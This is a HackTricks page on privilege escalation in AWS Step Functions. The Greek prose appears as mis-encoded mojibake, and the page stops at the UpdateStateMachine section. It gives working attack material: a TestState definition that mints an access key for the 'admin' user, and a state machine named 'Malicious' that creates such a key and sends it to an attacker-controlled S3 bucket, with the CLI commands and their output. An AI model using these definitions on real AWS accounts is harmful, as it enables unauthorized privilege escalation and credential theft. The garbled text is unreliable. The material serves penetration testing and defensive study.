# AWS - Step Functions Privesc

{% hint style="success" %}
ÎœÎ¬Î¸ÎµÏ„Îµ & ÎµÎ¾Î±ÏƒÎºÎ·Î¸ÎµÎ¯Ï„Îµ ÏƒÏ„Î¿ AWS Hacking:<img src="../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">\
ÎœÎ¬Î¸ÎµÏ„Îµ & ÎµÎ¾Î±ÏƒÎºÎ·Î¸ÎµÎ¯Ï„Îµ ÏƒÏ„Î¿ GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Î¥Ï€Î¿ÏƒÏ„Î®ÏÎ¹Î¾Î· HackTricks</summary>

* Î•Î»Î­Î³Î¾Ï„Îµ Ï„Î± [**ÏƒÏ‡Î­Î´Î¹Î± ÏƒÏ…Î½Î´ÏÎ¿Î¼Î®Ï‚**](https://github.com/sponsors/carlospolop)!
* **Î•Î³Î³ÏÎ±Ï†ÎµÎ¯Ï„Îµ ÏƒÏ„Î¿** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) Î® ÏƒÏ„Î¿ [**telegram group**](https://t.me/peass) Î® **Î±ÎºÎ¿Î»Î¿Ï…Î¸Î®ÏƒÏ„Îµ** Î¼Î±Ï‚ ÏƒÏ„Î¿ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **ÎœÎ¿Î¹ÏÎ±ÏƒÏ„ÎµÎ¯Ï„Îµ ÎºÏŒÎ»Ï€Î± hacking Ï…Ï€Î¿Î²Î¬Î»Î»Î¿Î½Ï„Î±Ï‚ PRs ÏƒÏ„Î±** [**HackTricks**](https://github.com/carlospolop/hacktricks) ÎºÎ±Î¹ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Step Functions

Î“Î¹Î± Ï€ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎµÏ‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ ÏƒÏ‡ÎµÏ„Î¹ÎºÎ¬ Î¼Îµ Î±Ï…Ï„Î® Ï„Î·Î½ Ï…Ï€Î·ÏÎµÏƒÎ¯Î± AWS, ÎµÎ»Î­Î³Î¾Ï„Îµ:

{% content-ref url="../aws-services/aws-stepfunctions-enum.md" %}
[aws-stepfunctions-enum.md](../aws-services/aws-stepfunctions-enum.md)
{% endcontent-ref %}

### Task Resources

Î‘Ï…Ï„Î­Ï‚ Î¿Î¹ Ï„ÎµÏ‡Î½Î¹ÎºÎ­Ï‚ ÎµÎºÎ¼ÎµÏ„Î¬Î»Î»ÎµÏ…ÏƒÎ·Ï‚ Î´Î¹ÎºÎ±Î¹Ï‰Î¼Î¬Ï„Ï‰Î½ Î¸Î± Î±Ï€Î±Î¹Ï„Î®ÏƒÎ¿Ï…Î½ Ï„Î· Ï‡ÏÎ®ÏƒÎ· Î¿ÏÎ¹ÏƒÎ¼Î­Î½Ï‰Î½ Ï€ÏŒÏÏ‰Î½ AWS step function Ï€ÏÎ¿ÎºÎµÎ¹Î¼Î­Î½Î¿Ï… Î½Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎ¿Ï…Î½ Ï„Î¹Ï‚ ÎµÏ€Î¹Î¸Ï…Î¼Î·Ï„Î­Ï‚ ÎµÎ½Î­ÏÎ³ÎµÎ¹ÎµÏ‚ ÎµÎºÎ¼ÎµÏ„Î¬Î»Î»ÎµÏ…ÏƒÎ·Ï‚ Î´Î¹ÎºÎ±Î¹Ï‰Î¼Î¬Ï„Ï‰Î½.

Î“Î¹Î± Î½Î± ÎµÎ»Î­Î³Î¾ÎµÏ„Îµ ÏŒÎ»ÎµÏ‚ Ï„Î¹Ï‚ Ï€Î¹Î¸Î±Î½Î­Ï‚ ÎµÎ½Î­ÏÎ³ÎµÎ¹ÎµÏ‚, Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î¼ÎµÏ„Î±Î²ÎµÎ¯Ï„Îµ ÏƒÏ„Î¿Î½ Î´Î¹ÎºÏŒ ÏƒÎ±Ï‚ Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼ÏŒ AWS, Î½Î± ÎµÏ€Î¹Î»Î­Î¾ÎµÏ„Îµ Ï„Î·Î½ ÎµÎ½Î­ÏÎ³ÎµÎ¹Î± Ï€Î¿Ï… Î¸Î± Î¸Î­Î»Î±Ï„Îµ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ ÎºÎ±Î¹ Î½Î± Î´ÎµÎ¯Ï„Îµ Ï„Î¹Ï‚ Ï€Î±ÏÎ±Î¼Î­Ï„ÏÎ¿Ï…Ï‚ Ï€Î¿Ï… Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯, ÏŒÏ€Ï‰Ï‚ ÏƒÏ„Î¿:

<figure><img src="../../../.gitbook/assets/telegram-cloud-photo-size-4-5920521132757336440-y.jpg" alt=""><figcaption></figcaption></figure>

Î‰ Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ ÎµÏ€Î¯ÏƒÎ·Ï‚ Î½Î± Î¼ÎµÏ„Î±Î²ÎµÎ¯Ï„Îµ ÏƒÏ„Î·Î½ Ï„ÎµÎºÎ¼Î·ÏÎ¯Ï‰ÏƒÎ· API AWS ÎºÎ±Î¹ Î½Î± ÎµÎ»Î­Î³Î¾ÎµÏ„Îµ Ï„Î± Î­Î³Î³ÏÎ±Ï†Î± ÎºÎ¬Î¸Îµ ÎµÎ½Î­ÏÎ³ÎµÎ¹Î±Ï‚:

* [**AddUserToGroup**](https://docs.aws.amazon.com/IAM/latest/APIReference/API\_AddUserToGroup.html)
* [**GetSecretValue**](https://docs.aws.amazon.com/secretsmanager/latest/apireference/API\_GetSecretValue.html)

### `states:TestState` & `iam:PassRole`

ÎˆÎ½Î±Ï‚ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï‚ Î¼Îµ Ï„Î± Î´Î¹ÎºÎ±Î¹ÏÎ¼Î±Ï„Î± **`states:TestState`** & **`iam:PassRole`** Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î´Î¿ÎºÎ¹Î¼Î¬ÏƒÎµÎ¹ Î¿Ï€Î¿Î¹Î±Î´Î®Ï€Î¿Ï„Îµ ÎºÎ±Ï„Î¬ÏƒÏ„Î±ÏƒÎ· ÎºÎ±Î¹ Î½Î± Ï€ÎµÏÎ¬ÏƒÎµÎ¹ Î¿Ï€Î¿Î¹Î¿Î½Î´Î®Ï€Î¿Ï„Îµ ÏÏŒÎ»Î¿ IAM ÏƒÎµ Î±Ï…Ï„Î®Î½ Ï‡Ï‰ÏÎ¯Ï‚ Î½Î± Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎµÎ¹ Î® Î½Î± ÎµÎ½Î·Î¼ÎµÏÏÏƒÎµÎ¹ Î¼Î¹Î± Ï…Ï€Î¬ÏÏ‡Î¿Ï…ÏƒÎ± Î¼Î·Ï‡Î±Î½Î® ÎºÎ±Ï„Î¬ÏƒÏ„Î±ÏƒÎ·Ï‚, ÎµÏ€Î¹Ï„ÏÎ­Ï€Î¿Î½Ï„Î±Ï‚ Î¼Î· ÎµÎ¾Î¿Ï…ÏƒÎ¹Î¿Î´Î¿Ï„Î·Î¼Î­Î½Î· Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÎµ Î¬Î»Î»ÎµÏ‚ Ï…Ï€Î·ÏÎµÏƒÎ¯ÎµÏ‚ AWS Î¼Îµ Ï„Î± Î´Î¹ÎºÎ±Î¹ÏÎ¼Î±Ï„Î± Ï„Ï‰Î½ ÏÏŒÎ»Ï‰Î½. Î£Ï…Î½Î´Ï…Î±ÏƒÎ¼Î­Î½Î±, Î±Ï…Ï„Î¬ Ï„Î± Î´Î¹ÎºÎ±Î¹ÏÎ¼Î±Ï„Î± Î¼Ï€Î¿ÏÎ¿ÏÎ½ Î½Î± Î¿Î´Î·Î³Î®ÏƒÎ¿Ï…Î½ ÏƒÎµ ÎµÎºÏ„ÎµÎ½ÎµÎ¯Ï‚ Î¼Î· ÎµÎ¾Î¿Ï…ÏƒÎ¹Î¿Î´Î¿Ï„Î·Î¼Î­Î½ÎµÏ‚ ÎµÎ½Î­ÏÎ³ÎµÎ¹ÎµÏ‚, Î±Ï€ÏŒ Ï„Î·Î½ Ï€Î±ÏÎ±Ï€Î¿Î¯Î·ÏƒÎ· ÏÎ¿ÏÎ½ ÎµÏÎ³Î±ÏƒÎ¯Î±Ï‚ Î³Î¹Î± Ï„Î·Î½ Ï„ÏÎ¿Ï€Î¿Ï€Î¿Î¯Î·ÏƒÎ· Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½ Î­Ï‰Ï‚ Î´Î¹Î±ÏÏÎ¿Î­Ï‚ Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½, Ï€Î±ÏÎ±Ï€Î¿Î¯Î·ÏƒÎ· Ï€ÏŒÏÏ‰Î½ ÎºÎ±Î¹ ÎµÎºÎ¼ÎµÏ„Î¬Î»Î»ÎµÏ…ÏƒÎ· Î´Î¹ÎºÎ±Î¹Ï‰Î¼Î¬Ï„Ï‰Î½.

{% code overflow="wrap" %}
```bash
aws states test-state --definition <value> --role-arn <value> [--input <value>] [--inspection-level <value>] [--reveal-secrets | --no-reveal-secrets]
```
{% endcode %}

Î¤Î± Ï€Î±ÏÎ±ÎºÎ¬Ï„Ï‰ Ï€Î±ÏÎ±Î´ÎµÎ¯Î³Î¼Î±Ï„Î± Î´ÎµÎ¯Ï‡Î½Î¿Ï…Î½ Ï€ÏÏ‚ Î½Î± Î´Î¿ÎºÎ¹Î¼Î¬ÏƒÎµÏ„Îµ Î¼Î¹Î± ÎºÎ±Ï„Î¬ÏƒÏ„Î±ÏƒÎ· Ï€Î¿Ï… Î´Î·Î¼Î¹Î¿Ï…ÏÎ³ÎµÎ¯ Î­Î½Î± access key Î³Î¹Î± Ï„Î¿Î½ Ï‡ÏÎ®ÏƒÏ„Î· **`admin`** ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏ…ÏŒÎ¼ÎµÎ½Î¿Ï‚ Î±Ï…Ï„Î­Ï‚ Ï„Î¹Ï‚ Î¬Î´ÎµÎ¹ÎµÏ‚ ÎºÎ±Î¹ Î­Î½Î±Î½ ÎµÏ€Î¹Ï„ÏÎµÏ€Ï„Î¹ÎºÏŒ ÏÏŒÎ»Î¿ Ï„Î¿Ï… Ï€ÎµÏÎ¹Î²Î¬Î»Î»Î¿Î½Ï„Î¿Ï‚ AWS. Î‘Ï…Ï„ÏŒÏ‚ Î¿ ÎµÏ€Î¹Ï„ÏÎµÏ€Ï„Î¹ÎºÏŒÏ‚ ÏÏŒÎ»Î¿Ï‚ Î¸Î± Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± Î­Ï‡ÎµÎ¹ Î¿Ï€Î¿Î¹Î±Î´Î®Ï€Î¿Ï„Îµ Ï€Î¿Î»Î¹Ï„Î¹ÎºÎ® Ï…ÏˆÎ·Î»ÏÎ½ Ï€ÏÎ¿Î½Î¿Î¼Î¯Ï‰Î½ ÏƒÏ…ÏƒÏ‡ÎµÏ„Î¹ÏƒÎ¼Î­Î½Î· Î¼Îµ Î±Ï…Ï„ÏŒÎ½ (Î³Î¹Î± Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î± **`arn:aws:iam::aws:policy/AdministratorAccess`**) Ï€Î¿Ï… ÎµÏ€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ ÏƒÏ„Î·Î½ ÎºÎ±Ï„Î¬ÏƒÏ„Î±ÏƒÎ· Î½Î± ÎµÎºÏ„ÎµÎ»ÎµÎ¯ Ï„Î·Î½ ÎµÎ½Î­ÏÎ³ÎµÎ¹Î± **`iam:CreateAccessKey`**:

* **stateDefinition.json**:
```json
{
"Type": "Task",
"Parameters": {
"UserName": "admin"
},
"Resource": "arn:aws:states:::aws-sdk:iam:createAccessKey",
"End": true
}
```
* **Î•Î½Ï„Î¿Î»Î®** Ï€Î¿Ï… ÎµÎºÏ„ÎµÎ»Î­ÏƒÏ„Î·ÎºÎµ Î³Î¹Î± Î½Î± Ï€ÏÎ±Î³Î¼Î±Ï„Î¿Ï€Î¿Î¹Î·Î¸ÎµÎ¯ Î· privesc:

{% code overflow="wrap" %}
```bash
aws stepfunctions test-state --definition file://stateDefinition.json --role-arn arn:aws:iam::<account-id>:role/PermissiveRole

{
"output": "{
\"AccessKey\":{
\"AccessKeyId\":\"AKIA1A2B3C4D5E6F7G8H\",
\"CreateDate\":\"2024-07-09T16:59:11Z\",
\"SecretAccessKey\":\"1a2b3c4d5e6f7g8h9i0j1a2b3c4d5e6f7g8h9i0j1a2b3c4d5e6f7g8h9i0j\",
\"Status\":\"Active\",
\"UserName\":\"admin\"
}
}",
"status": "SUCCEEDED"
}
```
{% endcode %}

**Î Î¹Î¸Î±Î½Î­Ï‚ Î•Ï€Î¹Ï€Ï„ÏÏƒÎµÎ¹Ï‚**: ÎœÎ· ÎµÎ¾Î¿Ï…ÏƒÎ¹Î¿Î´Î¿Ï„Î·Î¼Î­Î½Î· ÎµÎºÏ„Î­Î»ÎµÏƒÎ· ÎºÎ±Î¹ Ï‡ÎµÎ¹ÏÎ¹ÏƒÎ¼ÏŒÏ‚ ÏÎ¿ÏÎ½ ÎµÏÎ³Î±ÏƒÎ¯Î±Ï‚ ÎºÎ±Î¹ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÎµ ÎµÏ…Î±Î¯ÏƒÎ¸Î·Ï„Î¿Ï…Ï‚ Ï€ÏŒÏÎ¿Ï…Ï‚, Ï€Î¿Ï… Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î¿Î´Î·Î³Î®ÏƒÎµÎ¹ ÏƒÎµ ÏƒÎ·Î¼Î±Î½Ï„Î¹ÎºÎ­Ï‚ Ï€Î±ÏÎ±Î²Î¹Î¬ÏƒÎµÎ¹Ï‚ Î±ÏƒÏ†Î¬Î»ÎµÎ¹Î±Ï‚.

### `states:CreateStateMachine` & `iam:PassRole` & (`states:StartExecution` | `states:StartSyncExecution`)

ÎˆÎ½Î±Ï‚ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï‚ Î¼Îµ Ï„Î¿ **`states:CreateStateMachine`**& **`iam:PassRole`** Î¸Î± Î¼Ï€Î¿ÏÎ¿ÏÏƒÎµ Î½Î± Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎµÎ¹ Î¼Î¹Î± Î¼Î·Ï‡Î±Î½Î® ÎºÎ±Ï„Î±ÏƒÏ„Î¬ÏƒÎµÏ‰Î½ ÎºÎ±Î¹ Î½Î± Ï„Î·Ï‚ Ï€Î±ÏÎ­Ï‡ÎµÎ¹ Î¿Ï€Î¿Î¹Î¿Î½Î´Î®Ï€Î¿Ï„Îµ ÏÏŒÎ»Î¿ IAM, ÎµÏ€Î¹Ï„ÏÎ­Ï€Î¿Î½Ï„Î±Ï‚ Î¼Î· ÎµÎ¾Î¿Ï…ÏƒÎ¹Î¿Î´Î¿Ï„Î·Î¼Î­Î½Î· Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÎµ Î¬Î»Î»ÎµÏ‚ Ï…Ï€Î·ÏÎµÏƒÎ¯ÎµÏ‚ AWS Î¼Îµ Ï„Î¹Ï‚ Î¬Î´ÎµÎ¹ÎµÏ‚ Ï„Î¿Ï… ÏÏŒÎ»Î¿Ï…. Î£Îµ Î±Î½Ï„Î¯Î¸ÎµÏƒÎ· Î¼Îµ Ï„Î·Î½ Ï€ÏÎ¿Î·Î³Î¿ÏÎ¼ÎµÎ½Î· Ï„ÎµÏ‡Î½Î¹ÎºÎ® privesc (**`states:TestState`** & **`iam:PassRole`**), Î±Ï…Ï„Î® Î´ÎµÎ½ ÎµÎºÏ„ÎµÎ»ÎµÎ¯Ï„Î±Î¹ Î±Ï€ÏŒ Î¼ÏŒÎ½Î· Ï„Î·Ï‚, Î¸Î± Ï‡ÏÎµÎ¹Î±ÏƒÏ„ÎµÎ¯ ÎµÏ€Î¯ÏƒÎ·Ï‚ Î½Î± Î­Ï‡ÎµÏ„Îµ Ï„Î¹Ï‚ Î¬Î´ÎµÎ¹ÎµÏ‚ **`states:StartExecution`** Î® **`states:StartSyncExecution`** (**`states:StartSyncExecution`** **Î´ÎµÎ½ ÎµÎ¯Î½Î±Î¹ Î´Î¹Î±Î¸Î­ÏƒÎ¹Î¼Î· Î³Î¹Î± Ï„Ï…Ï€Î¹ÎºÎ­Ï‚ ÏÎ¿Î­Ï‚ ÎµÏÎ³Î±ÏƒÎ¯Î±Ï‚**, **Î¼ÏŒÎ½Î¿ Î³Î¹Î± ÎµÎºÏ†ÏÎ±ÏƒÎ¼Î­Î½ÎµÏ‚ Î¼Î·Ï‡Î±Î½Î­Ï‚ ÎºÎ±Ï„Î±ÏƒÏ„Î¬ÏƒÎµÏ‰Î½**) Ï€ÏÎ¿ÎºÎµÎ¹Î¼Î­Î½Î¿Ï… Î½Î± Î¾ÎµÎºÎ¹Î½Î®ÏƒÎµÏ„Îµ Î¼Î¹Î± ÎµÎºÏ„Î­Î»ÎµÏƒÎ· Ï€Î¬Î½Ï‰ ÏƒÏ„Î· Î¼Î·Ï‡Î±Î½Î® ÎºÎ±Ï„Î±ÏƒÏ„Î¬ÏƒÎµÏ‰Î½.

{% code overflow="wrap" %}
```bash
# Create a state machine
aws states create-state-machine --name <value> --definition <value> --role-arn <value> [--type <STANDARD | EXPRESS>] [--logging-configuration <value>]\
[--tracing-configuration <enabled=true|false>] [--publish | --no-publish] [--version-description <value>]

# Start a state machine execution
aws states start-execution --state-machine-arn <value> [--name <value>] [--input <value>] [--trace-header <value>]

# Start a Synchronous Express state machine execution
aws states start-sync-execution --state-machine-arn <value> [--name <value>] [--input <value>] [--trace-header <value>]
```
{% endcode %}

Î¤Î± Ï€Î±ÏÎ±ÎºÎ¬Ï„Ï‰ Ï€Î±ÏÎ±Î´ÎµÎ¯Î³Î¼Î±Ï„Î± Î´ÎµÎ¯Ï‡Î½Î¿Ï…Î½ Ï€ÏÏ‚ Î½Î± Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎµÏ„Îµ Î¼Î¹Î± Î¼Î·Ï‡Î±Î½Î® ÎºÎ±Ï„Î±ÏƒÏ„Î¬ÏƒÎµÏ‰Î½ Ï€Î¿Ï… Î´Î·Î¼Î¹Î¿Ï…ÏÎ³ÎµÎ¯ Î­Î½Î± access key Î³Î¹Î± Ï„Î¿Î½ Ï‡ÏÎ®ÏƒÏ„Î· **`admin`** ÎºÎ±Î¹ ÎµÎ¾Î¬Î³ÎµÎ¹ Î±Ï…Ï„ÏŒ Ï„Î¿ access key ÏƒÎµ Î­Î½Î± S3 bucket Ï€Î¿Ï… ÎµÎ»Î­Î³Ï‡ÎµÏ„Î±Î¹ Î±Ï€ÏŒ Ï„Î¿Î½ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿, ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏ…ÏŒÎ¼ÎµÎ½Î¿Ï‚ Î±Ï…Ï„Î­Ï‚ Ï„Î¹Ï‚ Î¬Î´ÎµÎ¹ÎµÏ‚ ÎºÎ±Î¹ Î­Î½Î±Î½ ÎµÏ€Î¹ÎµÎ¹ÎºÎ® ÏÏŒÎ»Î¿ Ï„Î¿Ï… Ï€ÎµÏÎ¹Î²Î¬Î»Î»Î¿Î½Ï„Î¿Ï‚ AWS. Î‘Ï…Ï„ÏŒÏ‚ Î¿ ÎµÏ€Î¹ÎµÎ¹ÎºÎ®Ï‚ ÏÏŒÎ»Î¿Ï‚ Î¸Î± Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± Î­Ï‡ÎµÎ¹ Î¿Ï€Î¿Î¹Î±Î´Î®Ï€Î¿Ï„Îµ Ï€Î¿Î»Î¹Ï„Î¹ÎºÎ® Ï…ÏˆÎ·Î»ÏÎ½ Ï€ÏÎ¿Î½Î¿Î¼Î¯Ï‰Î½ ÏƒÏ…Î½Î´ÎµÎ´ÎµÎ¼Î­Î½Î· Î¼Îµ Î±Ï…Ï„ÏŒÎ½ (Î³Î¹Î± Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î± **`arn:aws:iam::aws:policy/AdministratorAccess`**) Ï€Î¿Ï… ÎµÏ€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ ÏƒÏ„Î· Î¼Î·Ï‡Î±Î½Î® ÎºÎ±Ï„Î±ÏƒÏ„Î¬ÏƒÎµÏ‰Î½ Î½Î± ÎµÎºÏ„ÎµÎ»ÎµÎ¯ Ï„Î¹Ï‚ ÎµÎ½Î­ÏÎ³ÎµÎ¹ÎµÏ‚ **`iam:CreateAccessKey`** & **`s3:putObject`**.

* **stateMachineDefinition.json**:
```json
{
"Comment": "Malicious state machine to create IAM access key and upload to S3",
"StartAt": "CreateAccessKey",
"States": {
"CreateAccessKey": {
"Type": "Task",
"Resource": "arn:aws:states:::aws-sdk:iam:createAccessKey",
"Parameters": {
"UserName": "admin"
},
"ResultPath": "$.AccessKeyResult",
"Next": "PrepareS3PutObject"
},
"PrepareS3PutObject": {
"Type": "Pass",
"Parameters": {
"Body.$": "$.AccessKeyResult.AccessKey",
"Bucket": "attacker-controlled-S3-bucket",
"Key": "AccessKey.json"
},
"ResultPath": "$.S3PutObjectParams",
"Next": "PutObject"
},
"PutObject": {
"Type": "Task",
"Resource": "arn:aws:states:::aws-sdk:s3:putObject",
"Parameters": {
"Body.$": "$.S3PutObjectParams.Body",
"Bucket.$": "$.S3PutObjectParams.Bucket",
"Key.$": "$.S3PutObjectParams.Key"
},
"End": true
}
}
}
```
* **Î•Î½Ï„Î¿Î»Î®** Ï€Î¿Ï… ÎµÎºÏ„ÎµÎ»Î­ÏƒÏ„Î·ÎºÎµ Î³Î¹Î± **Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î¯Î± Ï„Î·Ï‚ Î¼Î·Ï‡Î±Î½Î®Ï‚ ÎºÎ±Ï„Î¬ÏƒÏ„Î±ÏƒÎ·Ï‚**:

{% code overflow="wrap" %}
```bash
aws stepfunctions create-state-machine --name MaliciousStateMachine --definition file://stateMachineDefinition.json --role-arn arn:aws:iam::123456789012:role/PermissiveRole
{
"stateMachineArn": "arn:aws:states:us-east-1:123456789012:stateMachine:MaliciousStateMachine",
"creationDate": "2024-07-09T20:29:35.381000+02:00"
}
```
{% endcode %}

* **Î•Î½Ï„Î¿Î»Î®** Ï€Î¿Ï… ÎµÎºÏ„ÎµÎ»Î­ÏƒÏ„Î·ÎºÎµ Î³Î¹Î± Î½Î± **Î¾ÎµÎºÎ¹Î½Î®ÏƒÎµÎ¹ Î¼Î¹Î± ÎµÎºÏ„Î­Î»ÎµÏƒÎ·** Ï„Î·Ï‚ Ï€ÏÎ¿Î·Î³Î¿Ï…Î¼Î­Î½Ï‰Ï‚ Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î·Î¼Î­Î½Î·Ï‚ Î¼Î·Ï‡Î±Î½Î®Ï‚ ÎºÎ±Ï„Î¬ÏƒÏ„Î±ÏƒÎ·Ï‚:

{% code overflow="wrap" %}
```json
aws stepfunctions start-execution --state-machine-arn arn:aws:states:us-east-1:123456789012:stateMachine:MaliciousStateMachine
{
"executionArn": "arn:aws:states:us-east-1:123456789012:execution:MaliciousStateMachine:1a2b3c4d-1a2b-1a2b-1a2b-1a2b3c4d5e6f",
"startDate": "2024-07-09T20:33:35.466000+02:00"
}
```
{% endcode %}

{% hint style="warning" %}
ÎŸ S3 ÎºÎ¬Î´Î¿Ï‚ Ï€Î¿Ï… ÎµÎ»Î­Î³Ï‡ÎµÏ„Î±Î¹ Î±Ï€ÏŒ Ï„Î¿Î½ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿ Î¸Î± Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± Î­Ï‡ÎµÎ¹ Î´Î¹ÎºÎ±Î¹ÏÎ¼Î±Ï„Î± Î½Î± Î±Ï€Î¿Î´Î­Ï‡ÎµÏ„Î±Î¹ Î¼Î¹Î± ÎµÎ½Î­ÏÎ³ÎµÎ¹Î± s3:PutObject Î±Ï€ÏŒ Ï„Î¿Î½ Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼ÏŒ Ï„Î¿Ï… Î¸ÏÎ¼Î±Ï„Î¿Ï‚.
{% endhint %}

**Î Î¹Î¸Î±Î½Î­Ï‚ Î•Ï€Î¹Ï€Ï„ÏÏƒÎµÎ¹Ï‚**: ÎœÎ· ÎµÎ¾Î¿Ï…ÏƒÎ¹Î¿Î´Î¿Ï„Î·Î¼Î­Î½Î· ÎµÎºÏ„Î­Î»ÎµÏƒÎ· ÎºÎ±Î¹ Ï‡ÎµÎ¹ÏÎ¹ÏƒÎ¼ÏŒÏ‚ ÏÎ¿ÏÎ½ ÎµÏÎ³Î±ÏƒÎ¯Î±Ï‚ ÎºÎ±Î¹ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÎµ ÎµÏ…Î±Î¯ÏƒÎ¸Î·Ï„Î¿Ï…Ï‚ Ï€ÏŒÏÎ¿Ï…Ï‚, Ï€Î¿Ï… Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î¿Î´Î·Î³Î®ÏƒÎµÎ¹ ÏƒÎµ ÏƒÎ·Î¼Î±Î½Ï„Î¹ÎºÎ­Ï‚ Ï€Î±ÏÎ±Î²Î¹Î¬ÏƒÎµÎ¹Ï‚ Î±ÏƒÏ†Î¬Î»ÎµÎ¹Î±Ï‚.

### `states:UpdateStateMachine` & (ÏŒÏ‡Î¹ Ï€Î¬Î½Ï„Î± Î±Ï€Î±ÏÎ±Î¯Ï„Î·Ï„Î¿) `iam:PassRole`

ÎˆÎ½Î±Ï‚ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï‚ Î¼Îµ Ï„Î·Î½ Î¬Î´ÎµÎ¹Î± **`states:UpdateStateMachine`** Î¸Î± Î¼Ï€Î¿ÏÎ¿ÏÏƒÎµ Î½Î± Ï„ÏÎ¿Ï€Î¿Ï€Î¿Î¹Î®ÏƒÎµÎ¹ Ï„Î¿Î½ Î¿ÏÎ¹ÏƒÎ¼ÏŒ Î¼Î¹Î±Ï‚ Î¼Î·Ï‡Î±Î½Î®Ï‚ ÎºÎ±Ï„Î±ÏƒÏ„Î¬ÏƒÎµÏ‰Î½, Ï€ÏÎ¿ÏƒÎ¸Î­Ï„Î¿Î½Ï„Î±Ï‚ ÎµÏ€Î¹Ï€Î»Î­Î¿Î½ ÎºÏÏ…Ï†Î­Ï‚ ÎºÎ±Ï„Î±ÏƒÏ„Î¬ÏƒÎµÎ¹Ï‚ Ï€Î¿Ï… Î¸Î± Î¼Ï€Î¿ÏÎ¿ÏÏƒÎ±Î½ Î½Î± ÎºÎ±Ï„Î±Î»Î®Î¾Î¿Ï…Î½ ÏƒÎµ ÎºÎ»Î¹Î¼Î¬ÎºÏ‰ÏƒÎ· Ï€ÏÎ¿Î½Î¿Î¼Î¯Ï‰Î½. ÎˆÏ„ÏƒÎ¹, ÏŒÏ„Î±Î½ Î­Î½Î±Ï‚ Î½ÏŒÎ¼Î¹Î¼Î¿Ï‚ Ï‡ÏÎ®ÏƒÏ„Î·Ï‚ Î¾ÎµÎºÎ¹Î½Î¬ Î¼Î¹Î± ÎµÎºÏ„Î­Î»ÎµÏƒÎ· Ï„Î·Ï‚ Î¼Î·Ï‡Î±Î½Î®Ï‚ ÎºÎ±Ï„Î±ÏƒÏ„Î¬ÏƒÎµÏ‰Î½, Î±Ï…Ï„Î® Î· Î½Î­Î± ÎºÎ±ÎºÏŒÎ²Î¿Ï…Î»Î· ÎºÏÏ…Ï†Î® ÎºÎ±Ï„Î¬ÏƒÏ„Î±ÏƒÎ· Î¸Î± ÎµÎºÏ„ÎµÎ»ÎµÎ¯Ï„Î±Î¹ ÎºÎ±Î¹ Î· ÎºÎ»Î¹Î¼Î¬ÎºÏ‰ÏƒÎ· Ï€ÏÎ¿Î½Î¿Î¼Î¯Ï‰Î½ Î¸Î± ÎµÎ¯Î½Î±Î¹ ÎµÏ€Î¹Ï„Ï…Ï‡Î®Ï‚.

